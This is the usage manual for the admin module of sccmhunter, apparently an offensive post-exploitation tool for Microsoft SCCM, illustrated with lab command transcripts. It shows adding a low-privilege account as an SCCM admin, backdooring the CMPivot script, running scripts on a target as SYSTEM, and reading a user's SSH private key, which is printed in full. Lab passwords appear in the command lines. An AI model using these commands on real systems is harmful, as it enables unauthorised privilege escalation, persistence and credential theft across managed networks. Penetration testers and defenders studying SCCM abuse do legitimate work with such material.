# Using the admin module

### Description

The admin module provides simulated command and control command line access to the SMS Provider's AdminService API. 

### Requirements

- Any (SMS Admins local group)

### Usage
```
└─# python3 sccmhunter.py admin -u administrator -p P@ssw0rd -ip 10.10.100.9 -h

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 vdev0.0.3                   
                                                                 @garrfoster                    
    
    
    
                                                                                                                                                                                               
 Usage: sccmhunter admin [OPTIONS] COMMAND [ARGS]...                                                                                                                                           
                                                                                                                                                                                               
 Run administrative commands through the AdminService API.                                                                                                                                     
                                                                                                                                                                                               
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *          -u          TEXT  Username [default: None] [required]                                                                                                                            │
│ *          -p          TEXT  Password or NTLM hash. (LM:NT) [default: None] [required]                                                                                                      │
│ *          -ip         TEXT  IP address or hostname of site server [default: None] [required]                                                                                               │
│            -debug            Enable Verbose Logging                                                                                                                                         │
│            -au         TEXT  Optional script approval username [default: None]                                                                                                              │
│            -ap         TEXT  Optional script approval password [default: None]                                                                                                              │
│    --help  -h                Show this message and exit.                                                                                                                                    │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯

```


### Commands


```
[19:26:57] INFO     [!] Enter help for extra shell commands                                                                                                                                    
() C:\ >> help -v

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

Database Commands
======================================================================================================
get_collection        Query for all (*) or single (id) collection(s)                                  
get_device            Query specific device information                                               
get_lastlogon         Query for devices the target recently signed in                                 
get_puser             Query for devices the target is a primary user                                  
get_user              Query specific user information                                                 

Interface Commands
======================================================================================================
exit                  Exit the console.                                                               
interact              Target Device/Collection to Query         interact (device code)                

PostEx Commands
======================================================================================================
add_admin             Add SCCM Admin                           add_admin (user) (sid)                 
backdoor              Backdoor CMPivot Script                  backdoor (/path/to/script)             
backup                Backup original CMPivot Script                                                  
delete_admin          Remove SCCM Admin                        delete_admin (user)                    
restore               Restore original CMPivot Script                                                 
script                Run script on target                     script (/path/to/script)               
show_admins           List admin users                        show_admins                             

Situational Awareness Commands
======================================================================================================
administrators        Query local administrators on target                                            
cat                   Read file contents.                      cat (filename)                         
cd                    Change current working directory.                                               
console_users         Show total time any users has logged on to the target.                          
disk                  Show disk information on the target.                                            
environment           Show configured environment variables on target.                                
ipconfig              Run ipconfig on target                                                          
list_disk             Show drives mounted to the target system.                                       
ls                    List files in current working directory.                                        
osinfo                Show OS info of target system.                                                  
ps                    List running processes on target.                                               
services              List running services on target.                                                
sessions              Show users with an active session on the target system.                         
shares                List file shares hosted on target.                                              
software              Show installed software on the target system.  

```

# get_collection

### Description
The get_collection module can pull data regarding a single collection or recover all configured collections from the site server. Each type of query is demonstrated in the example below.

### Usage

get_collection        Query for all (*) or single (id) collection(s)

### Example
```
() (C:\) >> get_collection *
[19:56:18] INFO     [-] * collection(s) not found. Pulling collections from the API                                                                                                                                                    
[19:56:18] INFO     [*] Collecting collections...                                                                                                                                                                                      
[19:56:20] INFO     +----------------+---------------+--------------------------------+                                                                                                                                                
                    | CollectionID   |   MemberCount | Name                           |                                                                                                                                                
                    +================+===============+================================+                                                                                                                                                
                    | SMS00001       |            20 | All Systems                    |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS00002       |             4 | All Users                      |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS00003       |             0 | All User Groups                |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS00004       |             4 | All Users and User Groups      |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMSOTHER       |             0 | All Custom Resources           |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS000US       |             2 | All Unknown Computers          |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS000PS       |             1 | All Provisioning Devices       |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMS000KM       |             0 | Co-management Eligible Devices |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMSDM001       |             0 | All Mobile Devices             |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
                    | SMSDM003       |            16 | All Desktop and Server Clients |                                                                                                                                                
                    +----------------+---------------+--------------------------------+                                                                                                                                                
() (C:\) >> get_collection SMS00001
[19:56:27] INFO     --------------------------------------                                                                                                                                                                             
                        CollectionID: SMS00001                                                                                                                                                                                         
                        CollectionType: 2                                                                                                                                                                                              
                        IsBuiltIn: True                                                                                                                                                                                                
                        LimitToCollectionName: None                                                                                                                                                                                    
                        MemberClassName: SMS_CM_RES_COLL_SMS00001                                                                                                                                                                      
                        MemberCount: 20                                                                                                                                                                                                
                        Name: All Systems                                                                                                                                                                                              
                        ------------------------------------------                                                                                                                                                                     
() (C:\) >> 
```

# get_device

### Description

The get_device command will query the site server for a provided hostname. If the request is the first time the host has been queried, the data is pulled from the API. Otherwise, the results are stored in a local database to avoid unnecessary queires.
### Usage

get_device [hostname]

### Example
```
() (C:\) >> get_device mp
[19:55:52] INFO     [*] Collecting device...                                                                                                                                                                                           
[19:55:53] INFO     [+] Device found.                                                                                                                                                                                                  
[19:55:53] INFO     ------------------------------------------                                                                                                                                                                         
                    Active: 1                                                                                                                                                                                                          
                    Client: 1                                                                                                                                                                                                          
                    DistinguishedName: CN=MP,OU=SCCM_SiteSystems,DC=internal,DC=lab                                                                                                                                                    
                    FullDomainName: INTERNAL.LAB                                                                                                                                                                                       
                    IPAddresses: 10.10.100.13                                                                                                                                                                                          
                    LastLogonUserDomain: None                                                                                                                                                                                          
                    LastLogonUserName: None                                                                                                                                                                                            
                    Name: MP                                                                                                                                                                                                           
                    OperatingSystemNameandVersion: Microsoft Windows NT Server 10.0                                                                                                                                                    
                    PrimaryGroupID: 515                                                                                                                                                                                                
                    ResourceId: 16777219                                                                                                                                                                                               
                    ResourceNames: mp.internal.lab                                                                                                                                                                                     
                    SID: S-1-5-21-4004054868-2969153893-1580793631-1106                                                                                                                                                                
                    SMSInstalledSites: LAB                                                                                                                                                                                             
                    SMSUniqueIdentifier: GUID:D78C19DA-D4ED-474F-88D4-1566B96F2732                                                                                                                                                     
                    ------------------------------------------                                                                                                                                                                         
() (C:\) >> 
```
# get_lastlogon

### Description
The get_lastlogon command will query the site for every client the provided user account was the last logged on user. 

### Usage

get_lastlogon [name]

### Example
```
() (C:\) >> get_lastlogon administrator
[19:57:23] INFO     [*] Collecting devices...                                                                                                                                                                                          
[19:57:25] INFO     +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
                    | FullDomainName   | LastLogonUserDomain   | LastLogonUserName   | Name     |   ResourceId | ResourceNames         |                                                                                               
                    +==================+=======================+=====================+==========+==============+=======================+                                                                                               
                    | INTERNAL.LAB     | LAB                   | administrator       | DP       |     16777221 | dp.internal.lab       |                                                                                               
                    +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
                    | INTERNAL.LAB     | LAB                   | administrator       | PC01     |     16777222 | pc01.internal.lab     |                                                                                               
                    +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
                    | INTERNAL.LAB     | LAB                   | administrator       | CA       |     16777223 | ca.internal.lab       |                                                                                               
                    +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
                    | INTERNAL.LAB     | LAB                   | administrator       | PROVIDER |     16777224 | provider.internal.lab |                                                                                               
                    +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
                    | INTERNAL.LAB     | LAB                   | administrator       | WSUS     |     16777226 | wsus.internal.lab     |                                                                                               
                    +------------------+-----------------------+---------------------+----------+--------------+-----------------------+                                                                                               
() (C:\) >> 
```

# get_puser
### Description
Query SCCM for any enrolled client where the supplied user account is configured as the primary user.

### Usage

get_puser [username]

### Example
```
() (C:\) >> get_puser lowpriv
[19:58:20] INFO     [-] Primary user data for lowpriv not found. Pulling from the API.                                                                                                                                                 
[19:58:20] INFO     [*] Collecting primary users...                                                                                                                                                                                    
[19:58:21] INFO     +------------+--------------------------+--------------+----------------+------------------+                                                                                                                       
                    | IsActive   |   RelationshipResourceID |   ResourceID | ResourceName   | UniqueUserName   |                                                                                                                       
                    +============+==========================+==============+================+==================+                                                                                                                       
                    | True       |                 25165830 |     16777250 | DEV            | lab\lowpriv      |                                                                                                                       
                    +------------+--------------------------+--------------+----------------+------------------+                                                                                                                       
() (C:\) >> 
```

# get_user

### Description

Query SCCM for details for a provided username.

### Usage

get_user [username]

### Example
```
() (C:\) >> get_user lowpriv
[19:59:01] INFO     [*] Collecting users...                                                                                                                                                                                            
[19:59:02] INFO     [+] User found.                                                                                                                                                                                                    
[19:59:02] INFO     ------------------------------------------                                                                                                                                                                         
                    DistinguishedName: CN=lowpriv,CN=Users,DC=internal,DC=lab                                                                                                                                                          
                    FullDomainName: INTERNAL.LAB                                                                                                                                                                                       
                    FullUserName: lowpriv                                                                                                                                                                                              
                    Mail:                                                                                                                                                                                                              
                    NetworkOperatingSystem: Windows NT                                                                                                                                                                                 
                    ResourceId: 2063597570                                                                                                                                                                                             
                    sid: S-1-5-21-4004054868-2969153893-1580793631-1113                                                                                                                                                                
                    UniqueUserName: LAB\lowpriv                                                                                                                                                                                        
                    UserAccountControl: 512                                                                                                                                                                                            
                    UserName: lowpriv                                                                                                                                                                                                  
                    UserPrincipalName: None                                                                                                                                                                                            
                    ------------------------------------------                                                                                                                                                                         
() (C:\) >> 
```

# add_admin

### Description
Add a provied account as a site server admin. This is useful for the scripts module where SCCM is configured to require a secondary account for script approval (default setting). The account type is not limited to a traditional user account and can be a machine. 
### Usage
add_admin [username] [sid]

### Example

```
() (C:\) >> show_admins 
[22:47:42] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                                                            
[22:47:43] INFO     Current Full Admin Users:                                                                                                                                                                                          
[22:47:43] INFO     LAB\Administrator                                                                                                                                                                                                  
() (C:\) >> add_admin lowpriv S-1-5-21-4004054868-2969153893-1580793631-1113
[22:47:47] INFO     Tasked SCCM to add lowpriv as an administrative user.                                                                                                                                                              
[22:47:49] INFO     [+] Successfully added lowpriv as an admin.                                                                                                                                                                        
() (C:\) >> show_admins 
[22:47:51] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                                                            
[22:47:52] INFO     Current Full Admin Users:                                                                                                                                                                                          
[22:47:52] INFO     LAB\Administrator                                                                                                                                                                                                  
[22:47:52] INFO     lowpriv                                                                                                                                                                                                            
() (C:\) >> 

```

# backdoor
### Description
Replace the built-in CMPivot script stored in the site server database with a user supplied script. This command will not run unless a backup exists for the script to ensure the operator is able to undue/restore the backdoored script.

### Usage


### Example

# backup
### Description
Backups the existing built-in CMPivot script. Required prior to any manipulation of the CMPivot script.

### Usage
### Example

# delete_admin
### Description
Remove a target administrator account from SCCM. Note: cannot be performed against itself.

### Usage
### Example

# restore
### Description
Restore a modified CMPivot script to its previous state.
### Usage
### Example

# script
### Description
Execute a provided PowerShell script on a target host. The script is intended to be self deleting from the remote host as well as from the site database. If the hierarchy is configured to require script approval (default) alternate credentials must be specified to approve the script. Alternate credentials can be obtained by using the `add_admin` command to add a secondary account as an administrator.
### Usage
### Examples
#### Script approval not required

#### Script approval required

Script execution fails
```
(16777221) (C:\) >> script /root/test.txt
[22:57:31] INFO     [+] Updates script created successfully with GUID c6006c4a-5590-4cac-9b49-48b86e80064f.                                                                                                                            
[22:57:35] INFO     [-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.                                                                                                  
[22:57:35] INFO     [*] Try using alternate approval credentials.                                                                                                                                                                      
[22:57:38] INFO     [+] Script with GUID c6006c4a-5590-4cac-9b49-48b86e80064f deleted.                                                                                                                                                 
(16777221) (C:\) >> 
```
Exit and provide alternate approval credentials. Run script again.

```
(16777221) (C:\) >> exit
                                                                                                                                                                                                                                       
┌──(root㉿kali)-[/opt/sccmhunter]
└─# python3 sccmhunter.py admin -u lab\\administrator -p P@ssw0rd -ip 10.10.100.9 -au lowpriv -ap P@ssw0rd

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 vdev0.0.3                   
                                                                 @garrfoster                    
    
    
    
[23:08:05] INFO     [!] Enter help for extra shell commands                                                                                                                                                                            
() C:\ >> interact 16777221
(16777221) (C:\) >> shell cat /root/test.txt
whoami
(16777221) (C:\) >> script /root/test.txt
[23:08:36] INFO     [+] Updates script created successfully with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be.                                                                                                                            
[23:08:39] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be approved.                                                                                                                                                
[23:08:43] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be executed.                                                                                                                                                
[23:09:04] INFO     [+] Got result:                                                                                                                                                                                                    
[23:09:04] INFO     nt authority\\system                                                                                                                                                                                               
[23:09:06] INFO     [+] Script with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be deleted.                                                                                                                                                 
(16777221) (C:\) >> 
```
# show_admins
### Description
### Usage
### Example

# interact
### Description 
Sets the target device for command line interactions to a specified ResourceID. This setting must be configured prior to any remote enumeration or script execution.

### Usage

interact [ResourceID]

### Example
In the below example, the `dp` device is queried. In the result the `16777221` is returned. The operator can now interact with that device and configure the command line. 


```
() (C:\) >> get_device dp
[19:54:23] INFO     ------------------------------------------                                                                                                                                                                         
                    Active: 1                                                                                                                                                                                                          
                    Client: 1                                                                                                                                                                                                          
                    DistinguishedName: CN=DP,OU=SCCM_SiteSystems,DC=internal,DC=lab                                                                                                                                                    
                    FullDomainName: INTERNAL.LAB                                                                                                                                                                                       
                    IPAddresses: 10.10.100.11                                                                                                                                                                                          
                    LastLogonUserDomain: LAB                                                                                                                                                                                           
                    LastLogonUserName: administrator                                                                                                                                                                                   
                    Name: DP                                                                                                                                                                                                           
                    OperatingSystemNameandVersion: Microsoft Windows NT Server 10.0                                                                                                                                                    
                    PrimaryGroupID: 515                                                                                                                                                                                                
                    ResourceId: 16777221                                                                                                                                                                                               
                    ResourceNames: dp.internal.lab                                                                                                                                                                                     
                    SID: S-1-5-21-4004054868-2969153893-1580793631-1105                                                                                                                                                                
                    SMSInstalledSites: LAB                                                                                                                                                                                             
                    SMSUniqueIdentifier: GUID:7484EE6B-8D62-40CE-97A4-079F30EDA5A0                                                                                                                                                     
                    ------------------------------------------                                                                                                                                                                         
() (C:\) >> interact 16777221
(16777221) (C:\) >> 
```

# administrators
### Description 
Query the interactive device for members of the device's local administrators group.

### Usage
See below.

### Example
```
(16777221) (C:\) >> administrators 
[19:38:17] INFO     Tasked SCCM to run Administrators.                                                                                                                                         
[19:38:19] INFO     Got OperationId 16779666. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:38:29] INFO     No results yet, sleeping 10 seconds.                                                                                                                                       
[19:38:41] INFO     +---------------+----------------------+-------------------+----------+                                                                                                    
                    | ObjectClass   | Name                 | PrincipalSource   | Device   |                                                                                                    
                    +===============+======================+===================+==========+                                                                                                    
                    | User          | DP\Administrator     | Local             | DP       |                                                                                                    
                    +---------------+----------------------+-------------------+----------+                                                                                                    
                    | Group         | LAB\Domain Admins    | ActiveDirectory   | DP       |                                                                                                    
                    +---------------+----------------------+-------------------+----------+                                                                                                    
                    | Group         | LAB\SCCM_SiteServers | ActiveDirectory   | DP       |                                                                                                    
                    +---------------+----------------------+-------------------+----------+  
```

# cat
### Description 
Display the contents of a file on the interactive device. The command line must be configured with the path to the file contents directory. For example, if the file you want to display is in "C:\Windows\Temp", you must issue a `cd` command to configure the command line with that file path in addition to the interactive device. NOTE: SCCM limits the result returned from scripts to 4KB. If the file size is larger it will be truncated or unreliable. Additionally, since scripts are used, you may need to supply alternate credentials. See scripts for more information.

### Usage
cat [filename]
### Example
```
(16777221) (C:\) >> cd C:\Users\administrator.LAB\.ssh
(16777221) (C:\Users\administrator.LAB\.ssh\) >> cat id_rsa
[23:21:41] INFO     Tasked SCCM to show id_rsa                                                                                                                                                                                         
[23:21:43] INFO     [+] Updates script created successfully with GUID 22057b18-d704-4734-ac35-2641eae96fb4.                                                                                                                            
[23:21:47] INFO     [+] Script with guid 22057b18-d704-4734-ac35-2641eae96fb4 approved.                                                                                                                                                
[23:21:49] INFO     [+] Script with guid 22057b18-d704-4734-ac35-2641eae96fb4 executed.                                                                                                                                                
[23:22:08] INFO     [+] Got result:                                                                                                                                                                                                    
[23:22:08] INFO     -----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                                                
                    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                                                                                                             
                    NhAAAAAwEAAQAAAYEAv0P8SG6b1AfXaWVmslD32pxVgncux1cxgNv6CnnG/OxDvAQdsBiB                                                                                                                                             
                    Pf2D3u8PjEkjH2x9N5te3sc5SK/3umM3RKu0QZ0fa6wbyUigPyq5NyRuNF9ky84A8OOrik                                                                                                                                             
                    0XBUtqt2sdQWRP4OJsN7YK6W2e5SMu0MJfveId6OmReYayVEMt4KSrYpQ62TGqwPOu56r9                                                                                                                                             
                    VSSu8l36fK7+nKzFCq2LeqCHD9/kXlbggRJZZdINgWX3IPpd9mqUKy74HBSXrgIjPaF76I                                                                                                                                             
                    4wuIIkFaMpQ1L5BBOZt/EgI//0PPkcGRlnevK+9G9gFfcQFN59BB0YGMjTNJ0zvtJswY7u                                                                                                                                             
                    gAkRINBoUPZFg0QlHa8a6zDF1v4uUrH0+2G43lLk90fyO4GfCSyGrYV33nfnIR1mYuPjFW                                                                                                                                             
                    xmhOiIV4F/sprTjR0v1YUxWVUfJIC0yG4ZIpWqr2Mh9tiuHgAlknJftecpnEaJlmWZKcvv                                                                                                                                             
                    nbKP+fsqgT2UP7bTAh0kcYE4M+gz1puYJoLyrFvLAAAFkMzZOuvM2TrrAAAAB3NzaC1yc2                                                                                                                                             
                    EAAAGBAL9D/Ehum9QH12llZrJQ99qcVYJ3LsdXMYDb+gp5xvzsQ7wEHbAYgT39g97vD4xJ                                                                                                                                             
                    Ix9sfTebXt7HOUiv97pjN0SrtEGdH2usG8lIoD8quTckbjRfZMvOAPDjq4pNFwVLardrHU                                                                                                                                             
                    FkT+DibDe2CultnuUjLtDCX73iHejpkXmGslRDLeCkq2KUOtkxqsDzrueq/VUkrvJd+nyu                                                                                                                                             
                    /pysxQqti3qghw/f5F5W4IESWWXSDYFl9yD6XfZqlCsu+BwUl64CIz2he+iOMLiCJBWjKU                                                                                                                                             
                    NS+QQTmbfxICP/9Dz5HBkZZ3ryvvRvYBX3EBTefQQdGBjI0zSdM77SbMGO7oAJESDQaFD2                                                                                                                                             
                    RYNEJR2vGuswxdb+LlKx9PthuN5S5PdH8juBnwkshq2Fd9535yEdZmLj4xVsZoToiFeBf7                                                                                                                                             
                    Ka040dL9WFMVlVHySAtMhuGSKVqq9jIfbYrh4AJZJyX7XnKZxGiZZlmSnL752yj/n7KoE9                                                                                                                                             
                    lD+20wIdJHGBODPoM9abmCaC8qxbywAAAAMBAAEAAAGBAIjAiT8Ypp4BRUl8UOMp9Sz/Hj                                                                                                                                             
                    x8DpxEgYaKwcp/q4DnRL7Hipp/ytiRzJm2/7zkBhLPtO/vTPOoKhMIje1cRwX4ZpeLSg3o                                                                                                                                             
                    Lq3KGZlQaME+cPVNR3pYvl99yQbHe7AzbgfatD4vBNXbzlg+9qpT0Iowj6Z/c4kGhTAk3/                                                                                                                                             
                    iuEA8jQUgfNNL0/OaSFm6DTQkjPqKD6fosq44+aJmJBhFOaC2zXR5CjLvPDhH7FqQwfauJ                                                                                                                                             
                    Rhr0J/6p0WrW2Frrdk/aAi/+pZ9UFqt2o4DD+zykEIJOoc6eKNGe+aUyynGM8KXC/P4e1U                                                                                                                                             
                    qogDHufaok0Nhhwp/TliazP80FMwYEib1uKdxinT1k1JaLYDfdptPaYWDBxBgnvFmsAEsH                                                                                                                                             
                    ePz8oc3nNePRR48PhfH/yqeUB8QryDkr6ril2E0UmqF2YU2fj7ZHx2JM3prPKx8vBiNrrG                                                                                                                                             
                    ZyyYcaYESiXbMXZ2/betlp0R3nQ1gTmv/vaqsN1wy8W8OBcQYz33SDq4j/xPkFcZBQoQAA                                                                                                                                             
                    AMAY/+54mljzB4VtLznw8y5A3vxFoQZM4Jb1FWr4fNXPkR0MS8W6o6bIFve/+b/P7se5m4                                                                                                                                             
                    QSrtCbKck8aQj1lb2apYAs9q899iQH4AZzz8x0taubQbpgA7eOkOB59zhom1biUi+WeU/P                                                                                                                                             
                    H7yKWgMY0evTigMSKDNmUoxXE8+Ay4Azm5pj8cL5oUWhVqwX/oJ67pIqpRCBPn7BXWz8i5                                                                                                                                             
                    NGSHaGfknMQhk2oT0+sYJrYDaFqF/YqQBgEbMUgbTI1uTvnKIAAADBAN5ZvoyiNYiNelQF                                                                                                                                             
                    Iv6S7FZIyu/OTGgQui6QxneWAcKEF53s3MP9KkzY9cx4JkWVik8+MC0MEqH8ds4HiYOIQG                                                                                                                                             
                    njJddl1AU43eO+w3whirOkorlPOat/ec1J11iRVUk59rm3Cahm4C/OX//jTbNsZ7EqyClU                                                                                                                                             
                    xqcSLe+k5OkTWllAKr6H1lTiLAidQBkm3sDMObDkiYeyKsPApL81hVPnpYizWSjGhlah7c                                                                                                                                             
                    VraPqUNWtDXOParqUq6kPKOwuoqOIfcwAAAMEA3DX0Bm71bnLqP6BA5b85R4NCcbp7GTdb                                                                                                                                             
                    gz5eBUxyPQ/I2AYrz8aMdvbP7jyRbHnMul+rbwU+NE4v0wG9GbQzxuHbizVWKHKeFWNwsd                                                                                                                                             
                    pkeFf6c77iL6Tv2fTROkFhlroKPNKY0rzPYiCo4UyohnFYmyP4S+Rci8vpsAol53fllpaJ                                                                                                                                             
                    EMw09ZBUefL3uURnY3bTXkfroxCG0nULuVptxffvBQ/Lv9+efnrYIS890gEqm+zMxGu7ae                                                                                                                                             
                    ZLdczteWBuaAxJAAAAFGxhYlxhZG1pbmlzdHJhdG9yQGRwAQIDBAUG                                                                                                                                                             
                    -----END OPENSSH PRIVATE KEY-----                                                                                                                                                                                  
[23:22:12] INFO     [+] Script with GUID 22057b18-d704-4734-ac35-2641eae96fb4 deleted.                                                                                                                                                 
(16777221) (C:\Users\administrator.LAB\.ssh\) >> 
```


# cd
### Description
Change directories on the command line. This is required for both the `ls` and `cat` commands.


### Usage

cd [filepath]

### Example
```
(16777221) (C:\) >> cd C:\Users
(16777221) (C:\Users\) >> ls
[23:25:28] INFO     Tasked SCCM to list files in C:\Users\.                                                                                                                                                                            
[23:25:28] INFO     Got OperationId 16779694. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
[23:25:41] INFO     +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | FileName                   | Mode   | LastWriteTime       |   Size | Device   |                                                                                                                                  
                    +============================+========+=====================+========+==========+                                                                                                                                  
                    | C:\Users\Administrator     | d----- | 2024-01-27 05:53:07 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\administrator.LAB | d----- | 2024-02-08 07:21:12 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\All Users         | d--hsl | 2021-05-08 08:34:03 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\Default           | d-rh-- | 2024-01-27 21:59:32 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\Default User      | d--hsl | 2021-05-08 08:34:03 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\Public            | d-r--- | 2024-01-27 05:53:07 |      1 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
                    | C:\Users\desktop.ini       | -a-hs- | 2021-05-08 08:18:31 |    174 | DP       |                                                                                                                                  
                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
(16777221) (C:\Users\) >> 
```

# console_users
### Description
### Usage
### Example
```
(16777221) (C:\) >> console_users 
[19:39:28] INFO     Tasked SCCM to show all users that have signed in.                                                                                                                         
[19:39:31] INFO     Got OperationId 16779667. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:39:41] INFO     +---------------------+-------------------------+-------------------------------+---------------------------+----------+                                                   
                    | LastConsoleUse      |   NumberOfConsoleLogons | SystemConsoleUser             |   TotalUserConsoleMinutes | Device   |                                                   
                    +=====================+=========================+===============================+===========================+==========+                                                   
                    | 2024-01-27 14:08:00 |                       1 | win-3sflnhdib39\administrator |                       495 | DP       |                                                   
                    +---------------------+-------------------------+-------------------------------+---------------------------+----------+                                                   
                    | 2024-01-28 22:42:35 |                       1 | lab\administrator             |                      2435 | DP       |                                                   
                    +---------------------+-------------------------+-------------------------------+---------------------------+----------+ 
```

# disk
### Description
### Usage
### Example
```
(16777221) (C:\) >> disk
[19:40:23] INFO     Tasked SCCM to show disk information of 16777221.                                                                                                                          
[19:40:24] INFO     Got OperationId 16779668. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:40:35] INFO     +--------+------------------+-------------+-------------+--------------+----------------------+----------+                                                                 
                    | Name   | Description      |        Size |   FreeSpace | Compressed   | VolumeSerialNumber   | Device   |                                                                 
                    +========+==================+=============+=============+==============+======================+==========+                                                                 
                    | C:     | Local Fixed Disk | 53012852736 | 40399273984 | False        | 5E2D550E             | DP       |                                                                 
                    +--------+------------------+-------------+-------------+--------------+----------------------+----------+                                                                 
                    | D:     | CD-ROM Disc      |  5044094976 |           0 | False        | D10C768B             | DP       |                                                                 
                    +--------+------------------+-------------+-------------+--------------+----------------------+----------+
```

# environment
### Description
### Usage
### Example
```
(16777221) (C:\) >> environment 
[19:40:51] INFO     Tasked SCCM to show Environment variables of 16777221.                                                                                                                     
[19:40:53] INFO     Got OperationId 16779669. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:41:03] INFO     No results yet, sleeping 10 seconds.                                                                                                                                       
[19:41:14] INFO     +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | Caption                           | Description                       | Name                   | Status   | SystemVariable   | UserName                     |            
                    VariableValue                                                                                                                              | Device   |                    
                    +===================================+===================================+========================+==========+==================+==============================+============
                    ================================================================================================================================+==========+                               
                    | <SYSTEM>\ComSpec                  | <SYSTEM>\ComSpec                  | ComSpec                | OK       | True             | <SYSTEM>                     |            
                    %SystemRoot%\system32\cmd.exe                                                                                                              | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\DriverData               | <SYSTEM>\DriverData               | DriverData             | OK       | True             | <SYSTEM>                     |            
                    C:\Windows\System32\Drivers\DriverData                                                                                                     | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\OS                       | <SYSTEM>\OS                       | OS                     | OK       | True             | <SYSTEM>                     | Windows_NT 
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\Path                     | <SYSTEM>\Path                     | Path                   | OK       | True             | <SYSTEM>                     |            
                    %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\ | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\PATHEXT                  | <SYSTEM>\PATHEXT                  | PATHEXT                | OK       | True             | <SYSTEM>                     |            
                    .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC                                                                                      | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\PROCESSOR_ARCHITECTURE   | <SYSTEM>\PROCESSOR_ARCHITECTURE   | PROCESSOR_ARCHITECTURE | OK       | True             | <SYSTEM>                     | AMD64      
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
